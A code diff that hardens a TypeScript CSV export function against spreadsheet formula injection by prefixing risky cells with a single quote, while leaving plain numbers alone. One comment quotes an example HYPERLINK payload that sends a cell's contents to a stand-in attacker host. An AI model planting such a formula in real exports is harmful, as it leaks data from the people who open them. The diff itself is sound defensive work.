@@ -12,13 +12,38 @@ import { CORS_HEADERS } from './http';
  */
 
 /**
+ * Characters that make Excel, Google Sheets and LibreOffice treat a cell as a
+ * live formula rather than text. Member-controlled columns (display names,
+ * notes, emails) reach these exports verbatim, so a name saved as
+ * `=HYPERLINK("http://evil.example/?"&A1,"Payroll")` would execute the moment
+ * an operator opens the download. Leading TAB and CR count too: the spreadsheet
+ * skips them before it looks at the first real character.
+ */
+const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
+
+/**
+ * Plain numbers are left exactly as they are. Several exports carry negative
+ * money (wallet adjustments, refunds), and neutralising `-2500` would turn a
+ * numeric column into text for every downstream reader.
+ */
+const PLAIN_NUMBER = /^[+-]?(?:\d+(?:\.\d+)?|\.\d+)(?:[eE][+-]?\d+)?$/;
+
+/**
  * Escapes one CSV field per RFC 4180: wrap in double quotes (doubling any
  * embedded quote) whenever the value contains a comma, quote, or newline.
  * `null`/`undefined` become an empty field, not the literal string "null".
+ *
+ * A value that opens with a formula trigger and is not a plain number is first
+ * prefixed with a single quote, which spreadsheets read as "this cell is text".
+ * That happens BEFORE the quoting test, so a value starting with CR still gets
+ * wrapped as well.
  */
 export function csvEscape(value: unknown): string {
   if (value === null || value === undefined) return '';
-  const str = typeof value === 'string' ? value : String(value);
+  let str = typeof value === 'string' ? value : String(value);
+  if (FORMULA_TRIGGER.test(str) && !PLAIN_NUMBER.test(str)) {
+    str = `'${str}`;
+  }
   if (/[",\r\n]/.test(str)) {
     return `"${str.replace(/"/g, '""')}"`;
   }
